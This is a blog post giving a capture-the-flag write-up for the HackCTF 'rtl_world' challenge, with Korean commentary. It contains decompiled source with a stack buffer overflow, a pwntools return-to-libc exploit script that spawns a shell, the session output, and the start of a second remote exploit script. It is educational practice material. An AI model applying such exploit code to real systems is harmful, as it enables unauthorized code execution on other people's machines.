<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="HackCTF rtl_world" /><meta name="author" content="Ph4nt0m" /><meta property="og:locale" content="en_US" /><meta name="description" content="rtl_world" /><meta property="og:description" content="rtl_world" /><link rel="canonical" href="https://phantomn.github.io/posts/HackCTF-rtl_world/" /><meta property="og:url" content="https://phantomn.github.io/posts/HackCTF-rtl_world/" /><meta property="og:site_name" content="Ph4nt0m" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-03-31T17:00:00+09:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackCTF rtl_world" /><meta name="twitter:site" content="@Ph4nt0mm" /><meta name="twitter:creator" content="@Ph4nt0m" /><meta name="google-site-verification" content="google494dd82c35d0ccd4.html" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Ph4nt0m"},"description":"rtl_world","url":"https://phantomn.github.io/posts/HackCTF-rtl_world/","@type":"BlogPosting","headline":"HackCTF rtl_world","dateModified":"2021-03-31T17:00:00+09:00","datePublished":"2021-03-31T17:00:00+09:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://phantomn.github.io/posts/HackCTF-rtl_world/"},"@context":"https://schema.org"}</script><title>HackCTF rtl_world | Ph4nt0m</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/me.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ph4nt0m</a></div><div class="site-subtitle font-italic">Just Vulnerability Researcher</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Phantomn" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/Ph4nt0mm" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['newbiepwner','kakao.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackCTF rtl_world</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackCTF rtl_world</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Ph4nt0m </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Mar 31, 2021, 5:00 PM +0900" prep="on" > Mar 31 <i class="unloaded">2021-03-31T17:00:00+09:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="947 words">5 min</span></div></div><div class="post-content"><h1 id="rtl_world">rtl_world</h1><h2 id="source">Source</h2><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">Get_Money</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax</span>
  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [esp+8h] [ebp-Ch]</span>
  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [esp+Ch] [ebp-8h]</span>
  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [esp+10h] [ebp-4h]</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">This world is F*cking JabonJui"</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"1) Farming..."</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"2) Item selling..."</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"3) Hunting..."</span><span class="p">);</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"(Job)&gt;&gt;&gt; "</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Item selling..."</span><span class="p">);</span>
    <span class="k">while</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">&lt;=</span> <span class="mi">350</span> <span class="p">)</span>
      <span class="o">++</span><span class="n">v3</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"+ 350 Gold"</span><span class="p">);</span>
    <span class="n">gold</span> <span class="o">+=</span> <span class="n">v3</span><span class="p">;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Your Gold is %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">gold</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Hunting..."</span><span class="p">);</span>
      <span class="k">while</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">&lt;=</span> <span class="mi">500</span> <span class="p">)</span>
        <span class="o">++</span><span class="n">v3</span><span class="p">;</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"+ 500 Gold"</span><span class="p">);</span>
      <span class="n">gold</span> <span class="o">+=</span> <span class="n">v3</span><span class="p">;</span>
      <span class="n">result</span> <span class="o">=</span> <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Your Gold is %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">gold</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Wow! you can find Hidden number!"</span><span class="p">);</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"Life is Just a One Shot..."</span><span class="p">);</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"Gambling..."</span><span class="p">);</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"+ %d Gold</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
      <span class="n">gold</span> <span class="o">+=</span> <span class="n">v2</span><span class="p">;</span>
      <span class="n">result</span> <span class="o">=</span> <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Your Gold is %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">gold</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Farming..."</span><span class="p">);</span>
    <span class="k">while</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">&lt;=</span> <span class="mi">100</span> <span class="p">)</span>
      <span class="o">++</span><span class="n">v3</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"+ 100 Gold"</span><span class="p">);</span>
    <span class="n">gold</span> <span class="o">+=</span> <span class="n">v3</span><span class="p">;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Your Gold is %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">gold</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax</span>
  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [esp+10h] [ebp-90h]</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span> <span class="c1">// [esp+14h] [ebp-8Ch]</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">v6</span><span class="p">;</span> <span class="c1">// [esp+94h] [ebp-Ch]</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">handle</span><span class="p">;</span> <span class="c1">// [esp+98h] [ebp-8h]</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">s1</span><span class="p">;</span> <span class="c1">// [esp+9Ch] [ebp-4h]</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">handle</span> <span class="o">=</span> <span class="n">dlopen</span><span class="p">(</span><span class="s">"/lib/i386-linux-gnu/libc.so.6"</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
  <span class="n">v6</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="s">"system"</span><span class="p">);</span>
  <span class="n">dlclose</span><span class="p">(</span><span class="n">handle</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">s1</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span> <span class="n">memcmp</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="s">"/bin/sh"</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span> <span class="n">s1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">s1</span> <span class="o">+</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">;</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">NPC [Village Presient] : "</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Binary Boss made our village fall into disuse..."</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"If you Have System Armor &amp;&amp; Shell Sword."</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"You can kill the Binary Boss..."</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Help me Pwnable Hero... :(</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Your Gold : %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">gold</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">Menu</span><span class="p">();</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"&gt;&gt;&gt; "</span><span class="p">);</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
    <span class="k">switch</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">case</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">continue</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">system</span><span class="p">(</span><span class="s">"clear"</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"[Binary Boss]</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Arch:     i386-32-little"</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"RELRO:    Partial RELRO"</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Stack:    No canary found"</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"NX:       NX enabled"</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"PIE:      No PIE (0x8048000)"</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"ASLR:  Enable"</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Binary Boss live in %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">handle</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Binart Boss HP is 140 + Armor + 4</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
        <span class="n">Get_Money</span><span class="p">(</span><span class="n">gold</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">gold</span> <span class="o">&lt;=</span> <span class="mi">1999</span> <span class="p">)</span>
        <span class="p">{</span>
          <span class="n">puts</span><span class="p">(</span><span class="s">"You don't have gold... :("</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
          <span class="n">gold</span> <span class="o">-=</span> <span class="mi">1999</span><span class="p">;</span>
          <span class="n">printf</span><span class="p">(</span><span class="s">"System Armor : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">4</span><span class="p">:</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">gold</span> <span class="o">&lt;=</span> <span class="mi">2999</span> <span class="p">)</span>
        <span class="p">{</span>
          <span class="n">puts</span><span class="p">(</span><span class="s">"You don't have gold... :("</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
          <span class="n">gold</span> <span class="o">-=</span> <span class="mi">2999</span><span class="p">;</span>
          <span class="n">printf</span><span class="p">(</span><span class="s">"Shell Sword : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">s1</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">5</span><span class="p">:</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[Attack] &gt; "</span><span class="p">);</span>
        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x400u</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">6</span><span class="p">:</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Your Not Hero... Bye..."</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><h2 id="solve">Solve</h2><p>문제가 복잡하게보이게 만들어져 있지만 i386이기에 ret에 페이로드를 넣으면 끝이다.</p><p>마침 5번의 read함수에서 buf[128]보다 크게 1024만큼 입력을 받는다. 이 부분을 이용해 페이로드를 작성하면 된다.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./rtl_world"</span><span class="p">)</span>
<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./rtl_world"</span><span class="p">)</span>

<span class="n">system</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="err">'</span><span class="n">system</span><span class="err">'</span><span class="p">]</span>
<span class="n">binsh</span> <span class="o">=</span> <span class="n">e</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="err">'</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">'</span><span class="p">).</span><span class="n">next</span><span class="p">()</span>
<span class="n">payload</span> <span class="o">=</span> <span class="err">''</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">144</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"AAAA"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>

<span class="n">print</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt;&gt; "</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"5"</span><span class="p">)</span>
<span class="n">print</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"[Attack] &gt; "</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="err">➜</span>  <span class="n">pwnable</span> <span class="n">git</span><span class="o">:</span><span class="p">(</span><span class="n">master</span><span class="p">)</span> <span class="n">python</span> <span class="n">rtl_world</span><span class="p">.</span><span class="n">py</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">ctf</span><span class="p">.</span><span class="n">j0n9hyun</span><span class="p">.</span><span class="n">xyz</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">3010</span><span class="o">:</span> <span class="n">Done</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">ubuntu</span><span class="o">/</span><span class="n">CTF</span><span class="o">/</span><span class="n">hackctf</span><span class="o">/</span><span class="n">pwnable</span><span class="o">/</span><span class="n">rtl_world</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>     <span class="n">i386</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="n">Stack</span><span class="o">:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>

<span class="n">NPC</span> <span class="p">[</span><span class="n">Village</span> <span class="n">Presient</span><span class="p">]</span> <span class="o">:</span>
<span class="n">Binary</span> <span class="n">Boss</span> <span class="n">made</span> <span class="n">our</span> <span class="n">village</span> <span class="n">fall</span> <span class="n">into</span> <span class="n">disuse</span><span class="p">...</span>
<span class="n">If</span> <span class="n">you</span> <span class="n">Have</span> <span class="n">System</span> <span class="n">Armor</span> <span class="o">&amp;&amp;</span> <span class="n">Shell</span> <span class="n">Sword</span><span class="p">.</span>
<span class="n">You</span> <span class="n">can</span> <span class="n">kill</span> <span class="n">the</span> <span class="n">Binary</span> <span class="n">Boss</span><span class="p">...</span>
<span class="n">Help</span> <span class="n">me</span> <span class="n">Pwnable</span> <span class="n">Hero</span><span class="p">...</span> <span class="o">:</span><span class="p">(</span>

<span class="n">Your</span> <span class="n">Gold</span> <span class="o">:</span> <span class="mi">1000</span>
<span class="o">=======</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">RTL</span> <span class="n">World</span> <span class="o">=======</span>
<span class="mi">1</span><span class="p">)</span> <span class="n">Information</span> <span class="n">the</span> <span class="n">Binary</span> <span class="n">Boss</span><span class="o">!</span>
<span class="mi">2</span><span class="p">)</span> <span class="n">Make</span> <span class="n">Money</span>
<span class="mi">3</span><span class="p">)</span> <span class="n">Get</span> <span class="n">the</span> <span class="n">System</span> <span class="n">Armor</span>
<span class="mi">4</span><span class="p">)</span> <span class="n">Get</span> <span class="n">the</span> <span class="n">Shell</span> <span class="n">Sword</span>
<span class="mi">5</span><span class="p">)</span> <span class="n">Kill</span> <span class="n">the</span> <span class="n">Binary</span> <span class="n">Boss</span><span class="o">!!!</span>
<span class="mi">6</span><span class="p">)</span> <span class="n">Exit</span>
<span class="o">====================================</span>
<span class="o">&gt;&gt;&gt;</span>
<span class="p">[</span><span class="n">Attack</span><span class="p">]</span> <span class="o">&gt;</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
<span class="err">$</span> <span class="n">id</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">attack</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">attack</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">attack</span><span class="p">)</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>+-------+---------+--------+-------------+-------+-------+-------+
| Dummy | pop3ret | <span class="nb">read</span><span class="o">()</span> | <span class="nb">read</span><span class="s1">'s retn | arg1  | arg2  | arg3  |
+-------+---------+--------+-------------+-------+-------+-------+
</span></pre></table></code></div></div><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1">#context.arch = 'i386'
#context.terminal=['tmux', 'splitw', '-h']
</span>
<span class="c1">#p = process("./rtl_world")
</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'ctf.j0n9hyun.xyz'</span> <span class="p">,</span><span class="mi">3010</span><span class="p">)</span>
<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./rtl_world"</span><span class="p">)</span>
